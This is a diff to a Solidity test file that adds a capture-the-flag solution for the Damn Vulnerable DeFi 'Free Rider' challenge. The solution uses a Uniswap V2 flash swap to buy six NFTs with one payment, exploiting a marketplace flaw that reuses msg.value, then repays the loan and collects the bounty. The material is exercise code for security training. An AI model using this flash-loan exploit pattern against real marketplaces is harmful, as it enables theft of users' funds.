@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import {IERC20} from "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
@@ -44,6 +45,8 @@ contract FreeRiderChallenge is Test {
         vm.stopPrank();
         _isSolved();
     }
+    fallback() payable external{}
+    receive() payable external{}
 
     /**
      * SETS UP CHALLENGE - DO NOT TOUCH
@@ -123,7 +126,56 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+        uniswapPair.swap(15e18,0, address(this), "hlo");
         
+    }
+
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
+        console.log("uniswapV2Call");
+        address token0;
+        address token1;
+        {
+            IUniswapV2Pair pair = IUniswapV2Pair(msg.sender);
+            token0 = pair.token0();
+            token1 = pair.token1();
+        }
+
+        // Determine which token was borrowed
+        uint amountTokenBorrowed = amount0 > 0 ? amount0 : amount1;
+        address tokenBorrowed = amount0 > 0 ? token0 : token1;
+
+        // Perform your custom logic (e.g., arbitrage, liquidation, etc.)
+        weth.withdraw(15e18);
+        uint256[] memory tokenIds = new uint[](6);
+        for(uint i=0;i<6;i++){
+            tokenIds[i]=i;
+        }
+        
+        marketplace.buyMany{value:15e18}(tokenIds);
+        weth.deposit{value:15e18}();
+
+        // Calculate the required repayment amount
+        uint fee = ((amountTokenBorrowed * 3) / 997) + 1; // Uniswap charges a 0.3% fee
+        uint amountRepay = amountTokenBorrowed + fee;
+        // Repay the flash swap
+        weth.deposit{value:amountRepay}();
+        for(uint i=0;i<6;i++){
+            nft.approve(address(recoveryManager), i);
+            bytes memory data = abi.encode(player);
+            nft.safeTransferFrom(address(this),address(recoveryManager),i,data);
+        }
+
+        weth.transfer(msg.sender, amountRepay);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
     }
 
     /**
